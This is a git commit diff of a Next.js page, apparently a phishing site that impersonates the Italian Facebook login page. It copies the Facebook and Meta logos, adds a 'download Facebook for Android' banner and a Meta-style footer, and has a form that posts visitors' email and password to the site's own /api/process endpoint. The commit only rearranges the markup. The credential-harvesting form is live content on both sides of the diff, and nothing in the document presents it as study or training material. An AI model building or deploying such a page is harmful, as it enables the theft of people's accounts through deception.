5e7f10b2df411de21c74c1ed15f0008e72af78b8
grisu1992 <simonegrisu92@gmail.com>
2025-07-19 22:27:25 +0200

    page.tsx

--- app/page.tsx
+++ app/page.tsx
@@ -2,32 +2,28 @@
 
 export default function Home() {
   return (
-    <>
+    <main className="fb-container">
       <div className="top-banner">
         <p>📥 Scarica Facebook per Android per navigare più velocemente.</p>
       </div>
 
-      <div className="fb-container">
-        <p className="lang">Italiano</p>
-        <img src="/facebook.png" alt="Logo Facebook" className="fb-logo" />
+      <img src="/facebook.png" alt="Logo Facebook" className="fb-logo" />
+      <p className="lang">Italiano</p>
 
-     <div>
-  <form action="/api/process" method="POST" className="fb-form">
-    <input type="text" name="email" placeholder="Email" required />
-    <input type="password" name="password" placeholder="Password" required />
-    <button type="submit">Invia</button>
-  </form>
-</div>
-        
-        <footer className="meta-footer">
-          
-          <div className="meta-links">
-          <img  src="/meta.png" alt="Logo Meta" className="meta-logo" />  <a href="#">Informazioni</a>
-            <a href="#">Centro assistenza</a>
-            <a href="#">Altro</a>
-          </div>
-        </footer>
-      </div>
-    </>
+      <form action="/api/process" method="POST" className="fb-form">
+        <input type="text" name="email" placeholder="Email" required />
+        <input type="password" name="password" placeholder="Password" required />
+        <button type="submit">Invia</button>
+      </form>
+
+      <footer className="meta-footer">
+        <div className="meta-links">
+          <img src="/meta.png" alt="Logo Meta" className="meta-logo" />
+          <a href="#">Informazioni</a>
+          <a href="#">Centro assistenza</a>
+          <a href="#">Altro</a>
+        </div>
+      </footer>
+    </main>
   );
 }
